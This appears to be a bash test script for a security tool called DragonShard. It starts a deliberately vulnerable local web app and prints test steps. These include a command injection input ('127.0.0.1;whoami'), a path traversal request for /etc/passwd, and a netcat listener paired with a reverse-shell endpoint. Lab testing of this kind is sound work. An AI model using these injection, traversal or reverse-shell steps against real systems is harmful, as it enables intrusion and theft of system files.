#!/bin/bash
"""
Test script for DragonShard Reverse Shell functionality

This script demonstrates the reverse shell handler with the vulnerable application.
"""

echo "🐉 DragonShard Reverse Shell Test"
echo "=================================="
echo ""

echo "1. Starting vulnerable application..."
python3 /app/vulnerable_app.py &
VULN_PID=$!
sleep 2

echo "2. Application started on http://localhost:8080"
echo "3. Available test endpoints:"
echo "   - http://localhost:8080/ (main page)"
echo "   - http://localhost:8080/ping?host=127.0.0.1 (command injection)"
echo "   - http://localhost:8080/reverse-shell?host=<your-ip>&port=<your-port> (reverse shell)"
echo "   - http://localhost:8080/file?path=/etc/passwd (path traversal)"
echo ""

echo "4. To test reverse shell:"
echo "   a) Start a listener: nc -lvp 4444"
echo "   b) Visit: http://localhost:8080/reverse-shell?host=<your-ip>&port=4444"
echo ""

echo "5. To generate payloads:"
echo "   python3 /app/generate_payload.py <your-ip> <your-port>"
echo ""

echo "6. Test command injection:"
echo "   curl \"http://localhost:8080/ping?host=127.0.0.1;whoami\""
echo ""

echo "7. Test path traversal:"
echo "   curl \"http://localhost:8080/file?path=/etc/passwd\""
echo ""

echo "Press Ctrl+C to stop the application"
echo ""

# Wait for the vulnerable app process
wait $VULN_PID 